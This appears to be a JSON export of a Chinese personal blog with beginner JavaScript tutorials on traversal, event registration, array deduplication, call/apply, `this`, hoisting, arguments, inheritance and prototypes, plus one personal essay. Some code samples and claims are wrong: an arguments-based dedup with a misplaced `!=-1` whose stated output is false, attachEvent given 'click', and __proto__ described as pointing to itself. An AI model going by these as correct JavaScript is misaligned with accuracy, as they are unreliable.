中序遍历：若树为空，则空操作返回，否则从根结点开始（注意并不是先访问根结点），中序遍历根结点的左子树，然后是访问根结点，最后中序遍历右子树。 12345678function LDR(node)&#123; if(node)&#123; LDR(node.children[0]); nodeArr.push(node); LDR(node.children[1]); &#125;&#125; 后序遍历：若树为空，则空操作返回，否则从左到右先叶子后结点的方式遍历访问左右子树，最后访问根结点。 12345678function LRD(node)&#123; if(node)&#123; LRD(node.children[0]); LRD(node.children[1]); nodeArr.push(node); &#125;&#125; 最后我们得到了按照遍历顺序排序的数组，再进行样式处理，代码如下 1234567891011function activeNode(arr)&#123; for(let i=0;i&lt;arr.length;i++)&#123; setTimeout(function()&#123; for(let j=0;j&lt;arr.length;j++)&#123; arr[j].className=\"\"; &#125;//清除所有节点样式 arr[i].className=\"active\";//给当前节点添加样式 &#125;,i*500)//i*500 给定时器创造时间间隔 &#125;&#125; 参考资料","tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://yoursite.com/tags/数据结构/"}]},{"title":"兼容性之事件注册","date":"2017-07-15T07:15:06.000Z","path":"2017/07/15/兼容性之事件注册/","text":"为什么要讨论事件注册的兼容性？我原来写代码总是想着世界是进步的，一些落后的东西终将被淘汰，但是兼容性一直都是前端工程师在处理的问题，似乎用”世界进步”这种无所谓的语气偷懒也不太恰当了，而且此处讨论的事件注册不仅仅是兼容性问题，有时候又是需求需要的了。 事件注册有哪些方法？ on+”event”,例如:onclick/onmouseover/onmouseenter/…支持最广，笔者用的最多，倘若要在一个元素上添加多次同一事件，此时就显得无能为力了，以最后一次绑定的事件为准。 addEventListener,W3C标准方法，功能也最强大，支持添加多个事件 123456//element.addEventListener(type,listener,useCapture);obj.addEventListener(\"click\",method1,false);obj.addEventListener(\"click\",method2,false);obj.addEventListener(\"click\",method3,false); 执行顺序为method1-&gt;method2-&gt;method3，第三个参数是指以“冒泡”还是“捕获”的标准绑定事件，一般为false(冒泡). 并且可以使用removeEventListener() 方法移除由 addEventListener()方法添加的事件句柄。 注意： 如果要移除事件句柄，addEventListener() 的执行函数必须使用外部函数，如上实例所示 (method1/2/3)。匿名函数，类似 “document.removeEventListener(“event“, function(){ myScript });” 该事件是无法移除的。 如果浏览器不支持 removeEventListener() 方法，你可以使用 detachEvent() 方法实现。 12345678var x = document.getElementById(\"myDIV\");if (x.removeEventListener) &#123; // // 所有浏览器，除了 IE 8 及更早IE版本 x.removeEventListener(\"mousemove\", myFunction);&#125; else if (x.detachEvent) &#123; // IE 8 及更早IE版本 x.detachEvent(\"onmousemove\", myFunction); &#125; attachEvent,IE家的方法，火狐与其他家浏览器都不支持,attachEvent——兼容：IE7、IE8；不兼容firefox、chrome、IE9、IE10、IE11、safari、opera.尽量不要用，支持绑定多个事件，与addEventListener()执行顺序相反，即method3-&gt;method2-&gt;method1 下面我们来进行兼容性处理： 通过if判断 123456789101112131415if(document.addEventListener)&#123;//功能最强大 div.addEventListener('click',function()&#123; alert('hello,world'); &#125;);&#125;else if(document.attachEvent)&#123;//非标准特性 尽量不要使用 div.attachEvent('click',function()&#123; alert('hello,world'); &#125;);&#125;else&#123;//支持最好 div['onclick']=function()&#123; alert('hello,world'); &#125;&#125; 封装成函数 1234567891011function registeEvent(elem,type,handler,useCapture)&#123; if(document.addEventListener)&#123;//功能最强大 elem.addEventListener(type,handler,useCapture); &#125;else if(document.attachEvent)&#123;//非标准特性 尽量不要使用 elem.attachEvent(type,handler); &#125;else&#123;//支持最好 elem['on'+type]=handler; &#125;&#125; 到这里，我们每次注册事件时都通过registeEvent注册，很明显，每次注册都要判断浏览器的能力是否支持，每一次都要检测，这不是我们想要的。 可以通过一个立即执行函数解决这个问题。 12345678910111213141516171819var registeEvent=(function createEventRegister()&#123; if(document.addEventListener)&#123; return function(elem,type,handler,useCapture)&#123; elem.addEventListener(type,handler,useCapture); &#125; &#125;else if(document.attachEvent)&#123; return function(elem,type,handler)&#123; elem.attachEvent(type,function()&#123; handler.call(elem,window.event);//注:attachEvent内部this指向window而不是触发对象,使用call方法修改this &#125;); &#125; &#125;else&#123; return function(elem,type,handler)&#123; elem['on'+type]=handler; &#125; &#125;&#125;)() 此后只用通过registeEvent方法注册事件即可，且只在最开始的时候进行一次能力检测. 12345registeEvent(div,\"click\",function()&#123; alert('hello,world');&#125;)","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"vuex-demo 记事本","date":"2017-07-08T01:58:20.000Z","path":"2017/07/08/vuex练手项目-记事本/","text":"vuex-demo 记事本 A Vue.js note project for practicing vuex项目地址:github预览地址:点击预览参考:实例 - Vue 单页应用：记事本作者:-MRLP__李鹏快速上手vuex作者:-PengL 预览图 完成功能 添加事件 删除事件 收藏事件 本地储存 注意事项 表单进行双向数据绑定时请务必使用v-model，不要使用双大括号的形式，不然视图会无法是刷新，没错这里说的就是textarea - -!!! editingNote是通过note赋值得到的，他们指向同一块内存区域，所以对editingNote操作也是对相应的note操作,值传递和引用传递明明大一就很熟了，现在还犯错 - -!!! 初始状态下的数组或对象在后面改变的长度或添加了属性，Vue无法检测到新增的项，此时应该是用Vue.set方法添加项，以便监视. vuex小结 state里面就是存放的状态,我的理解是要托管共享的数据 mutations就是存放如何更改状态方法 getters就是从state中派生出状态，比如将state中的某个状态进行过滤然后获取新的状态(数据)。 actions就是mutation的加强版，它可以通过commit mutations中的方法来改变状态，最重要的是它可以进行异步操作。 modules顾名思义，就是当用这个容器来装这些状态还是显得混乱的时候，我们就可以把容器分成几块，把状态和管理规则分类来装。这和我们创建js模块是一个目的，让代码结构更清晰。","tags":[{"name":"Vue","slug":"Vue","permalink":"http://yoursite.com/tags/Vue/"},{"name":"Vuex","slug":"Vuex","permalink":"http://yoursite.com/tags/Vuex/"}]},{"title":"数组去重","date":"2017-07-05T11:06:48.000Z","path":"2017/07/05/数组去重/","text":"前言：在做音乐播放器项目时，有一个功能是添加歌曲，很明显，歌曲是不能重复添加的。这时候我想到了es6的Array.from(new Set(arr))去重方法，很明显是不行的，歌曲都是对象，大部分去重方法只能解决基本数据类型的去重，犹记得学java时的equal方法，比较两个对象是否相等着实折腾了以下当初的我，这篇博文主要是总结一下js去重。 方法一：利用ES6的Array.from()/扩展运算符 以及 Set Array.from(): The Array.from() method creates a new Array instance from an array-like or iterable object. 该方法接收两个参数要转换的非数组对象,对每个元素进行处理的方法（可选）.在js中，有很多类数组对象（array-like object）和可遍历（iterable）对象（包括ES6新增的数据结构Set和Map），常见的类数组对象包括document.querySelectorAll()取到的NodeList，以及函数内部的arguments对象。它们都可以通过Array.from()转换为真正的数组，从而使用数组的方法。事实上只要对象具有length属性，就可以通过Array.from()转换为真正的数组。 Set:A collection of unique values that may be of any type. Set:一个可以是任何类型的独一无二的值的集合. 1234function unique(arr)&#123; return Array.from(new Set(arr));&#125; 你也可以这样写: 1234function unique(arr)&#123; return [...new Set(arr)];&#125; 方法二：遍历数组，建立新数组，利用indexOf判断是否存在于新数组中，不存在则push到新数组，最后返回新数组 Determines the index of the specific IThing in the list. indexOf() :方法可返回某个指定的字符串值在字符串中首次出现的位置。如果没有则返回-1 12345678910function unique(arr)&#123; var newArr = []; for(var i in arr) &#123; if(newArr.indexOf(arr[i]) == -1) &#123; newArr.push(arr[i]) &#125; &#125; return newArr;&#125; 方法三：遍历数组，利用object对象的key值保存数组值(key不重复)，判断数组值是否已经保存在object中，未保存则push到新数组并用object[arrayItem]=true的方式记录保存. 123456789101112function unique(arr) &#123; let hashTable = &#123;&#125;; let newArr = []; for(let i=0,l=arr.length;i&lt;l;i++) &#123; if(!hashTable[arr[i]]) &#123; hashTable[arr[i]] = true; newArr.push(arr[i]); &#125; &#125; return newArr;&#125; 方法四：先排序，新数组最后一项为旧数组第一项，每次插入判断新数组最后一项是否与插入项相等 123456789101112131415function unique(arr) &#123; var newArr = []; var end; //end其实就是一道卡 arr.sort(); end = arr[0]; newArr.push(arr[0]); for (var i = 1; i &lt; arr.length; i++) &#123; if (arr[i] != end) &#123; newArr.push(arr[i]); end = arr[i]; //更新end &#125; &#125; return newArr;&#125; 以上四种方法都是对于基本数据类型而言，如果换做对象数组就无能为力了，下面是对象数组的去重方法 方法一：利用对象的键名不能重复的特点 123456789101112function unique(arr)&#123; let unique = &#123;&#125;; arr.forEach(function(item)&#123; unique[JSON.stringify(item)]=item;//键名不会重复 &#125;) arr = Object.keys(unique).map(function(u)&#123; //Object.keys()返回对象的所有键值组成的数组，map方法是一个遍历方法，返回遍历结果组成的数组.将unique对象的键名还原成对象数组 return JSON.parse(u); &#125;) return arr;&#125; 12345/*map方法使用示例:*/var map = Array.prototype.mapvar a = map.call(\"Hello World\", function(x) &#123; return x.charCodeAt(0); &#125;)// a的值为[72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100] 存在的问题: {x:1,y:2}与{y:2,x:1}通过JSON.stringify字符串化值不同，但显然他们是重复的对象. 方法二：还是利用对象的键名无法重复的特点,必须知道至少一个对象数组中的对象的属性名 12345678910111213141516171819202122232425var songs = [ &#123;name:\"羽根\",artist:\"air\"&#125;, &#123;name:\"羽根\",artist:\"air\"&#125;, &#123;name:\"晴天\",artist:\"周杰伦\"&#125;, &#123;name:\"晴天\",artist:\"周杰伦\"&#125;, &#123;artist:\"周杰伦\",name:\"晴天\"&#125; ];function unique(songs)&#123; let result = &#123;&#125;; let finalResult=[]; for(let i=0;i&lt;songs.length;i++)&#123; result[songs[i].name]=songs[i]; //因为songs[i].name不能重复,达到去重效果,且这里必须知晓\"name\"或是其他键名 &#125; //console.log(result);&#123;\"羽根\":&#123;name:\"羽根\",artist:\"air\"&#125;,\"晴天\":&#123;name:\"晴天\",artist:\"周杰伦\"&#125;&#125; //现在result内部都是不重复的对象了，只需要将其键值取出来转为数组即可 for(item in result)&#123; finalResult.push(result[item]); &#125; //console.log(finalResult);[&#123;name:\"羽根\",artist:\"air\"&#125;,&#123;name:\"晴天\",artist:\"周杰伦\"&#125;] return finalResult;&#125;console.log(unique(songs)); Vue练手项目-音乐播放器","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"我纵身一跃，跳进人的海洋","date":"2017-07-04T14:38:24.000Z","path":"2017/07/04/我的青春/","text":"大三的暑假结束了。我的青春是不是也要结束了呢？ 前端的内容的确不少，这两个月里，玩儿了node爬虫，学习了vue，接触了一下所谓的前端工程化，有那么一二十天真的很迷茫，后来习惯的倒也发现就是那么回事。的确，有了这些工具写代码真是越来越轻松，但是为什么压力却越来越大呢？ 我只是用工具的人啊，我只是一个农民，用着拖拉机，我不知道拖拉机专门生产的，我只知道怎么用拖拉机为我工作，这样没错，这样很好，并不是所有人都需要去理解底层的原理，但是想要有所发展，就必须要有理解底层原理的能力。不然永远只是农民，成为不了拖拉机工程师呀。 为什么那么多人想学前端。 初学者html+css一个星期就能弄个静态页面出来，多简单。 前端难度是100分的话，html+css也就5分，剩下的95分都属于js，我目前接触的前端领域js才能被称为编程语言，html+css只是标记语言罢了。 当初jquery出世的时候，让很多人以为自己会编程了，方法都封装好了，傻子式操作。 前端框架换了一波又一波，工具数不胜数，花大精力学框架，学库在我看来是本末倒置的(看源码除外)，学习好了js，任何框架上手都不会太慢。 现在es6逐渐成为规范，es7也可以看见了，js也变得简单，也许某一天学习js也无需思考了，那到底什么是不变的？ 我翻了下考研408科目，计算机网络，数据结构与算法，操作系统，编译原理，大概就是这四门吧。 简单的使用工具是无法从根本意义上得到提高的。 工具，本来就是为了简化操作提高开发效率的啊，从jq的dom操作到vue的双向绑定，都是非常了不起的思想，但并不代表使用者了不起。所以我很佩服能把408学的特别好的人，因为他们上手什么都不会太慢，这就是基础，是内功。 应用级框架，工具学习来并不会太耗费心力，用别人的轮子而已，真正厉害的是那些创造轮子的人，而世界上大部分人已经被业务代码限制得死死了。 终点已经可以看得见了。 还有两个月就要秋招了，暑假安排如下： 尽可能的多学习算法知识 巩固前端基础知识 刷ife2017题目 了解前端工程化 整理之前的代码、博客、github 静下心来，调整心态 目标： 进入一个重视前端发展的公司 成为一个热爱生活的工程师","tags":[{"name":"琐事","slug":"琐事","permalink":"http://yoursite.com/tags/琐事/"},{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"}]},{"title":"call与apply","date":"2017-07-04T14:15:12.000Z","path":"2017/07/04/12-call与apply/","text":"call与apply首先来看一个demo: demo1: var p1={ name:&quot;赵志文&quot;, age:&quot;18&quot; } var name=&quot;周娇娇&quot;; function getName(){ console.log(this.name,this); } getName();//周娇娇 window //函数调用,this指向window(非严格模式) getName.call(p1);//赵志文 Object //改变了getName内部的this指向,指向p1 getName.apply(p1);//同上 相信各位读者通过上面的demo能够很轻易的知道call与apply的作用:改变调用函数内部的this指向. 我们回顾一下之前的构造函数: demo2: function Person(name,job){ //默认隐含的操作,将new创建的对象赋值给this this.name=name; this.job=job; this.sayHello=function(){ console.log(&apos;hello&apos;); } } var winter = new Person(&quot;winter&quot;,&quot;coding&quot;); 构造函数的执行过程: 使用new关键字创建对象; 调用构造函数,将新创建出来的对象赋值给对象函数内部的this;//如何做到? 在构造函数内部使用this为新创建的对象新增成员; 默认返回新创建的对象,普通函数如果不写返回语句,会返回undefined. new关键字就做了一点微小的工作 var obj={}; obj.__proto__=Person.prototype; Person.call(obj); 此处也是call与apply的一个典型用法. 使用call与apply,可以修改函数调用上下文,也就是this的值,这两个方法都是定义在Function.prototype中,所有函数都可以调用 Function.prototype.apply()/call()MDN文档中写道:”apply()方法在指定this值和参数(参数以数组或类数组形式存在)的情况下调用某个函数.” apply()方法与call()方法仅有的区别:call()方法接收的是一个参数列表,而apply()方法接收的是一个包含多个参数的数组(或类数组对象); 语法: fun.apply(thisArg [,argsArray]); fun.call(thisArg,para1,para2,...); 来看一个小demo: demo3: function demo3(a,b){ console.log(this.name+&quot;吃了&quot;+(a+b)+&quot;个西瓜&quot;); } var name=&quot;zzw&quot;; demo3(1,2);//函数调用模式 非严格模式下指向window zzw吃了3个西瓜 var obj={ name:&apos;zjj&apos; } var obj1={ name:&apos;sb&apos; } demo3.call(obj,4,5);//改变this指向为obj同时传参 zjj吃了9个西瓜 demo3.apply(obj1,[100,99]);//改变this指向为obj同时传参 sb吃了199个西瓜 案例: 求一个数组中的最大值 js中Math对象有个方法max,求出参数中的最大值但是往往给定的是数组 ,怎么办捏使用apply,这里就不改变this了,单纯数组转参数 知识点:apply与call第一个参数为null时,单纯调用函数,着眼于参数类型(例如给定数组,通过apply数组转参数列表) var arr=[1,20,157,76,84]; var max=Math.max.apply(null,arr); console.log(max); 将传入函数的参数打印出来,用’-‘连接 法一:自己的傻瓜拼接字符串法 function demo4(){ var res=&quot;&quot;; for(var j=0;j&lt;arguments.length;j++){ if(j&lt;arguments.length-1){ res+=arguments[j]+&quot;-&quot;; }else{ res+=arguments[j]; } } console.log(res); } demo4(1,2,3,&quot;abc&quot;,&quot;zzw&quot;);//1-2-3-abc-zzw 法二:可以重新创建一个数组容纳参数,调用join方法 function demo4(){ var arr=[]; for (var i = arguments.length - 1; i &gt;= 0; i--) { arr.unshift(arguments[i]); } arr=arr.join(&apos;-&apos;); console.log(arr); } demo4(1,2,3,&quot;abc&quot;,&quot;zzw&quot;);//1-2-3-abc-zzw 法三:直接借用join方法,改变join的内部this指向 function demo4(){ //return arguments.join(&quot;-&quot;);//报错 伪数组并非数组 不可以使用join var str=Array.prototype.join.call(arguments,&quot;-&quot;);//改变join内部的this console.log(str); //或写成 var str = [].join.call(arguments,&quot;-&quot;); } demo4(1,2,3,&quot;abc&quot;,&quot;zzw&quot;);//1-2-3-abc-zzw","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"this指向问题","date":"2017-07-04T14:15:08.000Z","path":"2017/07/04/11-this指向/","text":"首先我们需要复习函数的前三种调用模式函数调用模式函数有4种调用模式: 1. 方法调用模式(对象) 2. 函数调用模式(window对象) 3. 构造器调用模式(new) 4. 上下文模式 了解函数调用模式的不同,对于我们理解函数内部this指向有着重要的作用 方法调用模式与函数调用模式demo1: var age=38; var obj={ age:18, getAge:function(){ return this.age; } } console.log(obj.getAge());//18 方法调用模式 var getAge=obj.getAge; console.log(getAge());//38 函数调用模式 demo2: var age=38; var obj={ age:18, getAge:function(){//方法调用 this指向调用对象 console(this.age); function foo(){ console.log(this.age); } foo(); //函数调用,this指向window对象(非严格模式) } } obj.getAge();// 18 38 demo3: var length=10; function fn(){ console.log(this.length); } var obj={ length:5, method:function(fn){ fn();//10 arguments[0]();//2? } } obj.method(fn,123);//10 2 相当于arguments调用了fn 返回arguments的长度 arguments是一个包含很多属性的对象,键名为索引,键值为传进来的参数值 获取对象的属性值有两种方法:点方法与中括号法 obj.name === obj[‘name’] arguments[0] === arguments.0(并不能这样写) 调用arguments.0()==arguments[0]() 实际上是方法调用 理解不了看下面: var obj={abc:fn}; obj.abc();//方法调用 obj[&apos;abc&apos;]();//方法调用 构造器调用模式:demo4: function Person(name,age){ this.name=name; this.age=age; } var p=new Person(&apos;zzw&apos;,&apos;18&apos;); new关键字就做了一点微小的工作 var obj={}; obj.__proto__=Person.prototype; Person.call(obj);//通过call方法强行将构造函数内部的this指向了obj","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"变量提升","date":"2017-07-04T14:14:58.000Z","path":"2017/07/04/08-变量提升/","text":"变量提升JS代码的执行分为两个阶段预解析阶段 变量名和函数声明提升至当前作用域的最上方(只提升声明,不提升赋值) 执行阶段 按照从上至下的顺序执行语句 注意: 变量与函数同名时,只提升函数,不提升变量 函数同名时,都提升,后面的函数覆盖前面的函数 函数表达式只会提升变量名,赋值语句在执行阶段按照顺序执行 变量提升是分块的 条件是函数声明能否被提升取决于浏览器,不推荐使用if(true){function(){}}; 实例: //js中没有块级作用域的说法,大括号并不会创建一个作用域 for(var i=0;i&lt;5;i++){ console.log(i);//0 1 2 3 4 } console.log(i);//5 for循环外部依旧可以访问到i 只有函数能够创建作用域 变量提升是分作用域的 函数与变量同名只提升函数 但是变量赋值还是要执行的 代码: var num=10; function num(){ console.log(123); } num(); 预编译 function num(){ console.log(123); } num=10; num();//is not a function 函数与函数同名全部都会提升,但会以函数声明顺序进行覆盖,后面覆盖前面的 代码: function f1(){ console.log(&apos;first&apos;); } function f1(){ console.log(&apos;last&apos;); } 预编译: function f1(){ console.log(&apos;last&apos;) } 函数表达式与变量提升方式相同,变量赋值不会被提升,但变量声明会提升 代码: f1()//undefined var f1=function(){ console.log(&apos;f1&apos;); } 预编译: var f1;//提升 f1();//调用 undefined f1=function(){//赋值 console.log(&apos;f1&apos;); } 代码: function foo() { var num = 123; console.log(num); //123 } foo(); console.log(num); //is not defined 预编译: function foo() { var num; num = 123; console.log(num); //?123 } foo(); console.log(num); //is not defined //is not defined 没有定义 //undefined 定义了没有赋值 代码: var scope = &quot;global&quot;; foo(); function foo() { console.log(scope); //undefined var scope = &quot;local&quot;; console.log(scope); //local } 预编译: var scope; function foo(){ var scope; console.log(scope); scope = &quot;local&quot;; console.log(scope); } scope = &quot;global&quot;; foo(); //in 关键字 判断某个对象中是否有某个属性 代码: function f1(){ if(&quot;a&quot; in window){ var a = 10; } alert(a);//undefined } f1(); 预编译: function f1(){ var a; if(&quot;a&quot; in window){ a = 10; } alert(a);//undefined } f1(); 代码: if(&quot;a&quot; in window){ var a = 10; } alert(a); //10 预解析: var a; if(&quot;a&quot; in window){ a = 10; } alert(a); 代码: if(!&quot;a&quot; in window){ var a = 10; } alert(a); // undefined 预解析: var a; if(!&quot;a&quot; in window){ a=10; } alert(a); 代码: var foo = 1; function bar() { if(!foo) {//此处提升了foo但是是undefined 判断语句会转为!undefined --&gt;true var foo = 10; } alert(foo); //10 } bar(); 预解析: var foo; function bar(){ var foo;//undefined if(!foo) {//!undefined --&gt; ture foo = 10;//10 } alert(foo); //10 } foo = 1; bar(); 代码: function Foo() { getName = function(){ alert(1); }; return this; } Foo.getName = function() { alert(2); }; Foo.prototype.getName = function(){ alert(3); }; var getName = function() { alert(4); }; function getName(){ alert(5); } Foo.getName(); //2 getName(); //4 Foo().getName(); //1 getName(); //1 new Foo.getName(); //2 new Foo().getName(); //3 new new Foo().getName(); //3 预解析: function Foo() { getName = function(){ alert(1); }; return this; } var getName; function getName(){ alert(5); } Foo.getName = function() { alert(2); }; Foo.prototype.getName = function(){ alert(3); }; getName = function() { alert(4); }; getName(); //4 Foo().getName(); //1 getName(); //1 Foo.getName(); //2 new Foo.getName();//2 先执行Foo.getName() new关键字无效 (new Foo).getName();//3 先执行new Foo创建对象 new Foo().getName(); //3 先执行new Foo()创建对象 new new Foo().getName(); //3 相当于 new Foo().getName() new关键字无效","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"arguments对象","date":"2017-07-04T14:14:54.000Z","path":"2017/07/04/07-arguments对象/","text":"arguments对象属性: arguments.callee指向函数本身,常见于递归 实例:实现一个计算斐波那契数列的递归函数 //常见写法 function feibonaqi(n){ if(n===1){ return 1; } if(n===2){ return 1; } if(n&gt;2){ return feibonaqi(n-1)+feibonaqi(n-2); } } console.log(feibonaqi(11)); //倘若清除函数指向则会出现问题 function feibonaqi(n){ if(n===1){ return 1; } if(n===2){ return 1; } if(n&gt;2){ return feibonaqi(n-1)+feibonaqi(n-2); } } var myfeibonaqi = feibonaqi; feibonaqi=null;//清除原函数的指向,导致递归中调用失败 console.log(myfeibonaqi(11));//报错 //使用arguments.callee,指向函数自身 而不通过函数名指向,解决上述问题 function feibonaqi(n){ if(n===1){ return 1; } if(n===2){ return 1; } if(n&gt;2){ return arguments.callee(n-1)+arguments.callee(n-2); } } var myfeibonaqi = feibonaqi; feibonaqi=null;//清除原函数的指向,递归中却并没有使用原函数名 console.log(myfeibonaqi(11));//成功 arguments.length传入参数的个数 一个函数有形参的时候可以不传参 一个函数没有形参的时候可以传参 以上两条规则能够实现都是因为函数内部存在了arguments对象 一个函数不论有无形参,调用的时候都会将实参值传入arguments对象 arguments通过下标的形式取出参数值,但是arguments并不是一个数组 通过arguments的特性可以实现方法重载 实例:数组去重方法一: function noRepeat(){ var arr=[]; for(var k=0;k&lt;arguments.length;k++){ if(arr.indexOf(arguments[k]!=-1)){ arr.push(arguments[k]); } } return arr; } console.log(noRepeat(1,1,2,2,3,3));//1,2,3 方法二: function noRepeat(){ var arr=[]; for(var k=0;k&lt;arguments.length;k++){ arr[k]=arguments[k]; } for(var i=0;i&lt;arr.length;i++){ for(var j=i+1;j&lt;arr.length;j++){ if(arr[i]===arr[j]){ arr.splice(j,1); } } } return arr; } console.log(noRepeat(1,1,2,2,3,3));//1,2,3","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"函数","date":"2017-07-04T14:14:48.000Z","path":"2017/07/04/06-函数/","text":"函数创建函数的三种方式: 函数声明(提升) function fun(){ //函数体 } 函数表达式 在使用函数表达式声明函数时,function后面可接函数名funcname 但是在外部依旧通过name调用,funcname只限function内部访问,外部不可以 代码如下: var name = function funcname(){ } Function构造函数法构造函数 Function构造函数可以新建函数对象 语法如下: Function函数所有参数都是字符串 如果不传参数,表示创建一个空函数 var 函数名 = new Function(); 如果只有一个参数那么必须是函数体 var 函数名 = new Function(‘函数体’); 如果传多个参数,那么最后一个参数为函数体,前面的参数为将要创建的函数的形参名 var func=new Function(‘参数1’,’参数2’,…,’函数体’); Function也可以被当作一个构造函数,通过Function new出来的函数可以被当作是实例化的对象 Function这个构造函数也有原型对象 Function.prototype是一个空的函数(对象),是由Object构造函数创建的一个实例 Function.prototype.proto是Object.prototype,即Function的原型对象的原型对象其实就是所有obj的原型对象","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"继承初步","date":"2017-07-04T14:14:38.000Z","path":"2017/07/04/04-继承初步/","text":"继承混入式继承最简单的继承,使用for in 循环为对象动态添加成员,代码如下: var obj1={ name:&apos;zzw&apos;, age:&apos;18&apos; }; console.log(obj1); var obj2={}; for(var k in obj1){ obj2[k]=obj1[k]; } console.log(obj2); 原型式继承:ES5为我们提供了一个方法Object.create(obj),返回值为一个继承于obj对象的对象 var subObj = Object.create(superObj);//subObj继承了superObj的成员 //可以猜测实现方式如下: function create(superObj){ var F=function(){}; F.prototype=superObj; return new F(); } 由于此方法是ES5提供的,所以存在兼容性问题.如何解决兼容性问题呢? //检测浏览器能力 if(Object.create){//若浏览器支持 var subObj = Object.create(superObj); }else{//若浏览器不支持,自己添加这个方法 Object.create=function(){ var F=function(){}; F.prototype=superObj; return new F(); } } 封装成函数: function create(superObj){ if(Object.create){ return Object.create(superObj); }else{ Object.create=function(){ var F=function(){}; F.prototype=superObj; return new F(); } } } 通过原型继承(此处不讨论原型链) 给原型对象中添加成员(对象的动态特性,非严格意义上的继承) Person.prototype.sayHello=function(){ console.log('hello'); } var p = new Person('冯巩','50'); p.sayHello();//这里的p对象就继承了原型对象 直接替换原型对象,原型对象原本的属性无法保存 var parent={ saygoodbye:function(){ console.log('goodbye'); } }; Person.prototype=parent; var p1 = new Person('zzw','20'); p1.saygoodbye();//p对象就继承了原型对象,也就是我们的parent对象 用混入的方式为原型对象添加成员,保存了原型对象原有的属性(sayhi方法) Person.prototype.sayhi=function(){ console.log('hi'); } var parent={ saygoodbye:function(){ console.log('goodbye'); } }; for(var k in parent){ Person.prototype[k]=parent[k]; } var p2 = new Person('zzw','18'); p2.saygoodbye(); p2.sayhi();","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"原型","date":"2017-07-04T14:14:32.000Z","path":"2017/07/04/03-原型/","text":"原型-prototype:传统构造函数模式存在的问题:如果在构造函数中定义函数(skill)那么每次创建对象,都会重新创建该函数 function Student(name){ this.name=name; this.skill=function(){ console.log(&quot;goodgoodstudy&quot;); } } var zzw = new Student(&apos;zzw&apos;); var zjj = new student(&apos;zjj&apos;); 函数内部代码完全相同,而内存中存在了多个相同内容的函数,仅仅是地址不同,造成了资源浪费. 为了解决这个问题,我们要让所有对象共用一个方法,在构造函数外部定义好该函数. 将函数赋值给构造函数内部的方法,这样内存内只存在一个方法,对象内部的方法名全都指向该方法. function studyMethod(){ console.log(this.name+&quot;goodgoodstudy&quot;); } function Student(name){ this.name=name; this.skill=studyMethod; } var zzw = new Student(&apos;zzw&apos;); var zjj = new Student(&apos;zjj&apos;); zzw.skill(); /*同时该方法内部的this 指向调用其的对象*/ 问题又来了:如果对象公用的方法很多,那么就在构造函数外部定义好很多个函数,全局变量增多,造成污染,代码结构混乱,不易维护. 由此引入原型模式: 原型是什么:在构造函数创建出来的时候,浏览器会默认为构造函数创建并关联一个特殊的对象,即原型.原型默认是一个空的对象,原型对象是构造函数(对象)的属性. 原型可以用来做什么:原型对象的所有属性与方法都是被构造函数的实例对象所公用的.通过对象的动态特性为原型对象添加属性与方法. 原型对象创建出来的时候会有个默认的属性constructor指向对应构造函数.对象如何访问构造函数?p.constructor 原型对象创建出来的时候会有个默认的属性__proto__指向自身.对象如何访问原型?p.__proto__,这个属性竟然是原型对象提供给我们的. 原型对象添加成员的形式： 利用对象的动态特性添加成员(需要添加的成员较少时) 直接重写原型对象(需要添加的成员较多时) function Person(name,sex,age){ this.name=name; this.age=age; this.sex=sex; } Person.prototype.sayHello=function(){ console.log('hello'); }//为原型添加成员方法 var p1 = new Person('zzw','male','20'); Person.prototype={ sayGoodBye:function(){ console.log('byebye'); } }//替换原型 var p2 = new Person('zjj','female','19'); p1.sayHello();//hello p2.sayHello();//undefined 通过以上代码(09-原型.html)可以得知: 实例对象可以访问的原型对象的成员以实例对象创建时构造函数所关联的原型对象为主,倘若原型对象被重写,则重写之前实例化的实例对象依旧访问的是旧原型的成员(为原型新增成员不算重写). 使用原型模式的注意事项(10-原型.html): 1.当访问对象内部方法或属性时,首先在对象内部搜索,如果搜索不到则前往原型对象中查找; 2.使用点语法进行赋值的时候,如果对象中不存在该属性(值类型而非引用类型),则给该对象新增该属性,而不会去修改原型中的成员. 原型模式存在的问题 如果在原型中的属性是引用类型的属性,那么所有的实例对象共享该属性,并且一个实例对象修改了引用类型属性中的成员,其他对象也都会受影响.并不会新增该属性!! 所以一般情况下,不会将属性放在原型对象中,原型对象中只会存放共有的方法,将实例对象各自的属性写在构造函数中,称为构造函数与原型组合模式. __proto__ 属性:原型对象创建出来的时候会有个默认的属性 __proto__此属性指向原型对象自身.对象如何访问原型?对象. __proto____proto__ 是一个非标准属性,为了保证通用性,不推荐在代码中使用,调试时使用. constructor属性:原型对象创建出来的时候会有个默认的属性constructor此属性指向对应构造函数.对象如何访问构造函数?对象.constructor.重写构造函数的原型,constructor属性也被重写,不再指向关联的构造函数需要在新替换的原型中手动添加constructor的指向 //原型对象创建出来的时候会有个默认的属性constructor指向对应构造函数.对象如何访问构造函数?对象.constructor,实例对象可以访问原型对象中的constructor. function Person(name,age){ this.name=name; this.age=age; } console.log(Person.prototype.constructor);//function Person(...){} 通过构造函数的原型访问构造函数 var p = new Person(&apos;zzw&apos;,&apos;18&apos;); console.log(p.name);//zzw var p1 = new p.constructor(&apos;zjj&apos;,&apos;18&apos;);//通过已经创建好的实例对象调用构造函数 console.log(p1.name);//zjj Person.prototype={};//重写构造函数的原型,constructor属性也被重写,不再指向关联的构造函数,而是指向function Object(){...},与构造函数没有关联了 console.log(Person.prototype.constructor);//function Object(){...} 所以,为了保证重写原型对象后依旧可以形成 构造函数-原型对象-实例对象 的闭环,需要做以下操作: Person.prototype={ constructor:Person//手动添加constructor的指向 